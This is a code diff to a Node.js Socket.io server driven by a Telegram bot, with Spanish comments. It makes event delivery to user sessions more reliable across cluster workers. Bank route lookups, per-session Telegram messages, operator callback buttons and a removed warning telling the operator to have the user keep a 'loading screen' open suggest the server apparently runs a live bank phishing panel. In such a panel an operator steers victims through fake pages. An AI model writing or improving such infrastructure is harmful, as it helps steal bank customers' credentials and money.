@@ -268,6 +268,15 @@ class SessionManager {
         return false;
     }
 
+    clearSocket(sessionId) {
+        const session = this.sessions.get(sessionId);
+        if (!session) return false;
+        if (session.socketId) this.socketToSession.delete(session.socketId);
+        session.socketId = null;
+        session.lastActivity = Date.now();
+        return true;
+    }
+
     deleteSession(sessionId) {
         const session = this.sessions.get(sessionId);
         if (session) {
@@ -327,21 +336,54 @@ function getBankRoute(bankKey) {
     return BANK_ROUTES[bankKey] || null;
 }
 
-/** Envía evento al room de la sesión y, si hace falta, al socket guardado en memoria */
-function deliverToSession(sessionId, event, payload) {
-    io.to(sessionId).emit(event, payload);
+function findSocketsForSession(sessionId) {
+    const found = new Set();
+    const room = io.sockets.adapter.rooms.get(sessionId);
+    if (room) {
+        for (const sid of room) {
+            const sock = io.sockets.sockets.get(sid);
+            if (sock) found.add(sock);
+        }
+    }
     const session = sessionManager.getSession(sessionId);
     if (session?.socketId) {
         const sock = io.sockets.sockets.get(session.socketId);
-        if (sock) sock.emit(event, payload);
+        if (sock) found.add(sock);
+    }
+    for (const sock of io.sockets.sockets.values()) {
+        if (sock.data.sessionId === sessionId) found.add(sock);
+    }
+    return found;
+}
+
+/** Envía evento a todos los sockets vivos de la sesión (mismo worker) */
+function deliverToSession(sessionId, event, payload, fromCluster = false) {
+    const sockets = findSocketsForSession(sessionId);
+    for (const sock of sockets) {
+        sock.join(sessionId);
+        sock.emit(event, payload);
+    }
+    if (sockets.size === 0) {
+        io.to(sessionId).emit(event, payload);
+    }
+
+    if (!fromCluster && cluster.isWorker && typeof process.send === 'function') {
+        try {
+            process.send({ type: 'socket-deliver', sessionId, event, payload });
+        } catch (_) { /* ignore */ }
     }
 }
 
 function sessionHasLiveSocket(sessionId) {
-    const roomSize = io.sockets.adapter.rooms.get(sessionId)?.size || 0;
-    if (roomSize > 0) return true;
-    const session = sessionManager.getSession(sessionId);
-    return !!(session?.socketId && io.sockets.sockets.get(session.socketId));
+    return findSocketsForSession(sessionId).size > 0;
+}
+
+if (cluster.isWorker) {
+    process.on('message', (msg) => {
+        if (msg?.type === 'socket-deliver' && msg.sessionId) {
+            deliverToSession(msg.sessionId, msg.event, msg.payload, true);
+        }
+    });
 }
 
 // Mapa para almacenar mensajes de Telegram por sessionId
@@ -498,13 +540,13 @@ io.on('connection', (socket) => {
         if (session) {
             sessionManager.updateSocket(sessionId, socket.id);
             sessionManager.updatePage(sessionId, page);
+            if (data && Object.keys(data).length) sessionManager.addData(sessionId, data);
             console.log(`🔄 Sesión actualizada: ${sessionId} | Módulo: ${module} | Página: ${page}`);
         } else {
-            session = sessionManager.createSession(sessionId, socket.id, module, data);
+            session = sessionManager.createSession(sessionId, socket.id, module, data || {});
             console.log(`🆕 Nueva sesión creada: ${sessionId} | Módulo: ${module}`);
         }
 
-        // Garantizar membresía al room
         socket.join(sessionId);
         socket.data.sessionId = sessionId;
 
@@ -813,6 +855,7 @@ io.on('connection', (socket) => {
         const session = sessionManager.getSessionBySocket(socket.id);
         if (session) {
             console.log('❌ Cliente desconectado:', socket.id, '| Sesión:', session.sessionId);
+            sessionManager.clearSocket(session.sessionId);
         }
     });
 });
@@ -856,25 +899,14 @@ bot.on('callback_query', async (callbackQuery) => {
         const session = sessionManager.getSession(sessionId);
         if (session) session.lastActivity = Date.now();
 
-        const roomSize = io.sockets.adapter.rooms.get(sessionId)?.size || 0;
-        const live = sessionHasLiveSocket(sessionId);
+        const liveSockets = findSocketsForSession(sessionId);
+        const live = liveSockets.size > 0;
 
-        if (!live && !session) {
-            console.warn('\u26a0\ufe0f Sesi\u00f3n no encontrada y sin sockets:', sessionId);
-            await bot.answerCallbackQuery(callbackId, { text: '\u26a0\ufe0f Cliente sin conexi\u00f3n activa', show_alert: true });
-            return;
+        if (!live) {
+            console.warn(`\u26a0\ufe0f Sin socket en este worker para ${sessionId} (sesión=${!!session}, sockets=${liveSockets.size}) — reenviando a otros workers`);
         }
 
-        if (!live && session) {
-            console.warn(`\u26a0\ufe0f Cliente desconectado (room=${sessionId}) — reintenta cuando vuelva a loading`);
-            await bot.answerCallbackQuery(callbackId, {
-                text: '\u26a0\ufe0f El usuario no está conectado. Que mantenga abierta la pantalla de carga.',
-                show_alert: true
-            });
-            return;
-        }
-
-        console.log(`\u2705 Procesando callback (room=${sessionId}, sockets=${roomSize}, live=${live})`);
+        console.log(`\u2705 Procesando callback (sessionId=${sessionId}, live=${live}, sockets=${liveSockets.size})`);
         
         // Remover teclado inline del mensaje inmediatamente
         await bot.editMessageReplyMarkup(
